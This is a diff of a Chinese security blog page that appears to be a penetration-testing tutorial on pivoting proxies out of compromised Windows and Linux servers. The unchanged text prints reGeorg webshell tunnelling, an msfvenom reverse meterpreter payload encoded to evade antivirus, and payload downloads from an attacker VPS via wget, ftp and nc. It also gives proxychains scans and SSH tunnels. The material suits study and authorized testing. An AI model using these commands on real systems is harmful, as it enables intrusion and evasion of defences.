@@ -6,17 +6,17 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="前言渗透测试任务的后期，需要将目标系统内部的网络流量代理出来。实际情况中，不同的操作系统和Web服务会有不同的代理方法。下面以Web服务器操作系统Windows和Linux作为区分，阐述一些针对于这两类服务器的边界代理方法和技术。 Windows前提：拥有一个webshell或cmdshell。 1. webshell socks5代理这种方案典型的工具组合有reGeorg+proxychains">
+    <meta name="description" content="前言渗透测试任务的后期，需要将目标系统内部的网络流量代理出来。实际情况中，不同的操作系统和Web服务会有不同的代理方法。下面以Web服务器操作系统Windows和Linux作为区分，阐述一些针对于这两类服务器的边界代理方法和技术。 Windows前提：拥有一个webshell或cmdshell。 webshell socks5代理这种方案典型的工具组合有reGeorg+proxychains、re">
 <meta property="og:type" content="article">
 <meta property="og:title" content="渗透中的一些代理方法">
 <meta property="og:url" content="https://0x0c.cc/2017/03/29/渗透中的一些代理方法/index.html">
 <meta property="og:site_name" content="s4kur4">
-<meta property="og:description" content="前言渗透测试任务的后期，需要将目标系统内部的网络流量代理出来。实际情况中，不同的操作系统和Web服务会有不同的代理方法。下面以Web服务器操作系统Windows和Linux作为区分，阐述一些针对于这两类服务器的边界代理方法和技术。 Windows前提：拥有一个webshell或cmdshell。 1. webshell socks5代理这种方案典型的工具组合有reGeorg+proxychains">
+<meta property="og:description" content="前言渗透测试任务的后期，需要将目标系统内部的网络流量代理出来。实际情况中，不同的操作系统和Web服务会有不同的代理方法。下面以Web服务器操作系统Windows和Linux作为区分，阐述一些针对于这两类服务器的边界代理方法和技术。 Windows前提：拥有一个webshell或cmdshell。 webshell socks5代理这种方案典型的工具组合有reGeorg+proxychains、re">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-10-27T12:10:26.119Z">
+<meta property="og:updated_time" content="2020-10-31T03:06:55.293Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="渗透中的一些代理方法">
-<meta name="twitter:description" content="前言渗透测试任务的后期，需要将目标系统内部的网络流量代理出来。实际情况中，不同的操作系统和Web服务会有不同的代理方法。下面以Web服务器操作系统Windows和Linux作为区分，阐述一些针对于这两类服务器的边界代理方法和技术。 Windows前提：拥有一个webshell或cmdshell。 1. webshell socks5代理这种方案典型的工具组合有reGeorg+proxychains">
+<meta name="twitter:description" content="前言渗透测试任务的后期，需要将目标系统内部的网络流量代理出来。实际情况中，不同的操作系统和Web服务会有不同的代理方法。下面以Web服务器操作系统Windows和Linux作为区分，阐述一些针对于这两类服务器的边界代理方法和技术。 Windows前提：拥有一个webshell或cmdshell。 webshell socks5代理这种方案典型的工具组合有reGeorg+proxychains、re">
     
     
         
@@ -72,7 +72,7 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" href="/2018/07/31/剖析CLDAP协议-Reflection-DDoS/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        <li><a class="icon" href="/2017/06/08/用未授权的Redis弹弹弹弹弹/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" href="/2016/11/01/Rsync和Redis未授权访问导致的问题/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -103,7 +103,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows"><span class="toc-number">2.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-webshell-socks5代理"><span class="toc-number">2.1.</span> <span class="toc-text">1. webshell socks5代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-PowerShell远程加载无文件socks5代理"><span class="toc-number">2.2.</span> <span class="toc-text">2. PowerShell远程加载无文件socks5代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Metasploit-socks4a代理"><span class="toc-number">2.3.</span> <span class="toc-text">3. Metasploit socks4a代理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux"><span class="toc-number">3.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-webshell-socks5代理-1"><span class="toc-number">3.1.</span> <span class="toc-text">1. webshell socks5代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Metasploit-socks4a代理"><span class="toc-number">3.2.</span> <span class="toc-text">2. Metasploit socks4a代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-SSH-tunnel-socks5代理"><span class="toc-number">3.3.</span> <span class="toc-text">3. SSH tunnel socks5代理</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows"><span class="toc-number">2.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell-socks5代理"><span class="toc-number">2.1.</span> <span class="toc-text">webshell socks5代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell远程加载无文件socks5代理"><span class="toc-number">2.2.</span> <span class="toc-text">PowerShell远程加载无文件socks5代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit-socks4a代理"><span class="toc-number">2.3.</span> <span class="toc-text">Metasploit socks4a代理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux"><span class="toc-number">3.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell-socks5代理-1"><span class="toc-number">3.1.</span> <span class="toc-text">webshell socks5代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit-socks4a代理-1"><span class="toc-number">3.2.</span> <span class="toc-text">Metasploit socks4a代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-tunnel-socks5代理"><span class="toc-number">3.3.</span> <span class="toc-text">SSH tunnel socks5代理</span></a></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -144,7 +144,7 @@
   <div class="content" itemprop="articleBody">
     <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>渗透测试任务的后期，需要将目标系统内部的网络流量代理出来。实际情况中，不同的操作系统和Web服务会有不同的代理方法。下面以Web服务器操作系统Windows和Linux作为区分，阐述一些针对于这两类服务器的边界代理方法和技术。</p>
 <h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>前提：拥有一个webshell或cmdshell。</p>
-<h3 id="1-webshell-socks5代理"><a href="#1-webshell-socks5代理" class="headerlink" title="1. webshell socks5代理"></a>1. webshell socks5代理</h3><p>这种方案典型的工具组合有reGeorg+proxychains、reGeorg+proxifier等。通过上传reGeorg的tunnel webshell，以socks5的形式把内部网络代理出来。该方法的原理是利用tunnel脚本在服务器端开启socks5反向代理，随后以webshell形成一条链路到达本地，本地运行reGeorgSocksProxy.py即可通过相应的端口代理访问内网。示例：</p>
+<h3 id="webshell-socks5代理"><a href="#webshell-socks5代理" class="headerlink" title="webshell socks5代理"></a>webshell socks5代理</h3><p>这种方案典型的工具组合有reGeorg+proxychains、reGeorg+proxifier等。通过上传reGeorg的tunnel webshell，以socks5的形式把内部网络代理出来。该方法的原理是利用tunnel脚本在服务器端开启socks5反向代理，随后以webshell形成一条链路到达本地，本地运行reGeorgSocksProxy.py即可通过相应的端口代理访问内网。示例：</p>
 <p>上传tunnel webshell并在浏览器中打开：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://0x0c.cc/tunnel.php</span><br></pre></td></tr></table></figure>
 
@@ -155,7 +155,7 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn -p 1-10000 192.168.1.0/24</span><br></pre></td></tr></table></figure>
 
 <p>此方法不会顾及网络消息传递规则和所处的网络环境，只要能访问上传的webshell即可以进行socks5代理，使用起来非常方便。但实际情况下，服务器往往受到保护，会使代理的成功率降低。</p>
-<h3 id="2-PowerShell远程加载无文件socks5代理"><a href="#2-PowerShell远程加载无文件socks5代理" class="headerlink" title="2. PowerShell远程加载无文件socks5代理"></a>2. PowerShell远程加载无文件socks5代理</h3><p>Windows PowerShell是一种命令行程序和脚本环境，它支持用户使用.Net Framework的功能。PowerShell有这样一种操作：通过在PowerShell脚本中嵌入二进制文件的方式启动运行该二进制文件，因此无需写入磁盘（<a href="https://truesecdev.wordpress.com/2016/03/15/embedding-exe-files-into-powershell-scripts" target="_blank" rel="noopener">https://truesecdev.wordpress.com/2016/03/15/embedding-exe-files-into-powershell-scripts</a>），达到无文件（文件不落盘）运行的效果。</p>
+<h3 id="PowerShell远程加载无文件socks5代理"><a href="#PowerShell远程加载无文件socks5代理" class="headerlink" title="PowerShell远程加载无文件socks5代理"></a>PowerShell远程加载无文件socks5代理</h3><p>Windows PowerShell是一种命令行程序和脚本环境，它支持用户使用.Net Framework的功能。PowerShell有这样一种操作：通过在PowerShell脚本中嵌入二进制文件的方式启动运行该二进制文件，因此无需写入磁盘（<a href="https://truesecdev.wordpress.com/2016/03/15/embedding-exe-files-into-powershell-scripts" target="_blank" rel="noopener">https://truesecdev.wordpress.com/2016/03/15/embedding-exe-files-into-powershell-scripts</a>），达到无文件（文件不落盘）运行的效果。</p>
 <p>得益于PowerShell脚本大集合PowerSploit（<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a>），可以很容易地利用PowerShell实现远程加载脚本的无文件socks5代理。比如使用PowerShell+PowerSploit+Earthworm的工具组合。</p>
 <p>首先在自己的vps开web服务，并在根目录下放置PowerSploit的脚本<code>Invoke-ReflectivePEInjection.ps1</code>（这里要使用<code>@clymb3r</code>修改后的脚本<a href="https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" target="_blank" rel="noopener">https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1</a>）以及EarthWorm可执行文件ew.exe。</p>
 <p>先让EtherWorm监听：</p>
@@ -166,7 +166,7 @@
 
 <p>这样就能反弹出一个socks5的代理到vps，接下来使用Proxifier等工具接管代理就可以了。不过实际实践的时候未成功…抛出一个<code>_PE platform doesn’t match the architecture of the process it is being loadedin (32/64bit)_</code>的错误，按照文章<a href="https://truesecdev.wordpress.com/2016/03/15/embedding-exe-files-into-powershell-scripts" target="_blank" rel="noopener">https://truesecdev.wordpress.com/2016/03/15/embedding-exe-files-into-powershell-scripts</a>的方法使用32位的PowerShell依然无法正常执行，并且出现崩溃的现象，暂时还未解决。</p>
 <p>很喜欢此方法的思路，真的非常棒。</p>
-<h3 id="3-Metasploit-socks4a代理"><a href="#3-Metasploit-socks4a代理" class="headerlink" title="3. Metasploit socks4a代理"></a>3. Metasploit socks4a代理</h3><p>因为已经拥有了webshell，所以可以先使用msfvenom生成一个能反弹meterpreter的webshell或者可执行文件exe。示例：</p>
+<h3 id="Metasploit-socks4a代理"><a href="#Metasploit-socks4a代理" class="headerlink" title="Metasploit socks4a代理"></a>Metasploit socks4a代理</h3><p>因为已经拥有了webshell，所以可以先使用msfvenom生成一个能反弹meterpreter的webshell或者可执行文件exe。示例：</p>
 <p>msfvenom生成一个反弹meterpreter的可执行文件，并使用多层编码进行免杀：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/alpha_upper -i 5 --platform windows --arch x86 lhost=1.2.3.4 lport=4444 -f raw | msfvenom -e x86/shikata_ga_nai -i 5 --platform windows --arch x86 -f raw | msfvenom -e x86/countdown -i 5 --platform windows --arch x86 -f exe -o test.exe</span><br></pre></td></tr></table></figure>
 
@@ -193,8 +193,8 @@
 
 <p>最后使用proxychains、MacProxy等代理工具接管socks4a代理就好。</p>
 <h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>由于Linux自带很多工具，例如nc、wget、python等等，因此当Linux服务器做代理往往比Windows容易。如果已经拥有了Linux下的webshell、bashshell，可以使用以下几种方法。</p>
-<h3 id="1-webshell-socks5代理-1"><a href="#1-webshell-socks5代理-1" class="headerlink" title="1. webshell socks5代理"></a>1. webshell socks5代理</h3><p>与Windows一致。</p>
-<h3 id="2-Metasploit-socks4a代理"><a href="#2-Metasploit-socks4a代理" class="headerlink" title="2. Metasploit socks4a代理"></a>2. Metasploit socks4a代理</h3><p>与Windows中一致，不过生成马注意要生成Linux下的可执行文件<code>.elf</code>（或webshell也行）。在上传马时可以采取相同的思路，即先上传至vps，再从服务器端进行下载，下载的方法有：</p>
+<h3 id="webshell-socks5代理-1"><a href="#webshell-socks5代理-1" class="headerlink" title="webshell socks5代理"></a>webshell socks5代理</h3><p>与Windows一致。</p>
+<h3 id="Metasploit-socks4a代理-1"><a href="#Metasploit-socks4a代理-1" class="headerlink" title="Metasploit socks4a代理"></a>Metasploit socks4a代理</h3><p>与Windows中一致，不过生成马注意要生成Linux下的可执行文件<code>.elf</code>（或webshell也行）。在上传马时可以采取相同的思路，即先上传至vps，再从服务器端进行下载，下载的方法有：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp s4kur4@1.2.3.4 2121</span><br><span class="line">ftp&gt; get test.elf /tmp/test.elf</span><br><span class="line">ftp&gt; bye</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -c http://0x0c.cc/test.elf -P /tmp/</span><br></pre></td></tr></table></figure>
@@ -203,7 +203,7 @@
 
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -l -p 8787 &lt; /home/test.elf   # vps:1.2.3.4</span><br><span class="line">nc 1.2.3.4 8787 &gt; /tmp/test.elf   # Server</span><br></pre></td></tr></table></figure>
 
-<h3 id="3-SSH-tunnel-socks5代理"><a href="#3-SSH-tunnel-socks5代理" class="headerlink" title="3. SSH tunnel socks5代理"></a>3. SSH tunnel socks5代理</h3><p>SSH提供了三种方式的端口转发功能，能够将其他TCP端口的网络数据通过SSH进行转发，极大地方便了渗透测试过程中数据流的穿越。</p>
+<h3 id="SSH-tunnel-socks5代理"><a href="#SSH-tunnel-socks5代理" class="headerlink" title="SSH tunnel socks5代理"></a>SSH tunnel socks5代理</h3><p>SSH提供了三种方式的端口转发功能，能够将其他TCP端口的网络数据通过SSH进行转发，极大地方便了渗透测试过程中数据流的穿越。</p>
 <p>例如，当目标Web服务器的SSH服务可以直接被访问时，利用SSH动态端口转发可以实现一条命令的socks5代理：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -qTNf -D 127.0.0.1:12345 root@1.2.3.4</span><br></pre></td></tr></table></figure>
 
@@ -244,7 +244,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows"><span class="toc-number">2.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-webshell-socks5代理"><span class="toc-number">2.1.</span> <span class="toc-text">1. webshell socks5代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-PowerShell远程加载无文件socks5代理"><span class="toc-number">2.2.</span> <span class="toc-text">2. PowerShell远程加载无文件socks5代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Metasploit-socks4a代理"><span class="toc-number">2.3.</span> <span class="toc-text">3. Metasploit socks4a代理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux"><span class="toc-number">3.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-webshell-socks5代理-1"><span class="toc-number">3.1.</span> <span class="toc-text">1. webshell socks5代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Metasploit-socks4a代理"><span class="toc-number">3.2.</span> <span class="toc-text">2. Metasploit socks4a代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-SSH-tunnel-socks5代理"><span class="toc-number">3.3.</span> <span class="toc-text">3. SSH tunnel socks5代理</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows"><span class="toc-number">2.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell-socks5代理"><span class="toc-number">2.1.</span> <span class="toc-text">webshell socks5代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell远程加载无文件socks5代理"><span class="toc-number">2.2.</span> <span class="toc-text">PowerShell远程加载无文件socks5代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit-socks4a代理"><span class="toc-number">2.3.</span> <span class="toc-text">Metasploit socks4a代理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux"><span class="toc-number">3.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell-socks5代理-1"><span class="toc-number">3.1.</span> <span class="toc-text">webshell socks5代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit-socks4a代理-1"><span class="toc-number">3.2.</span> <span class="toc-text">Metasploit socks4a代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-tunnel-socks5代理"><span class="toc-number">3.3.</span> <span class="toc-text">SSH tunnel socks5代理</span></a></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
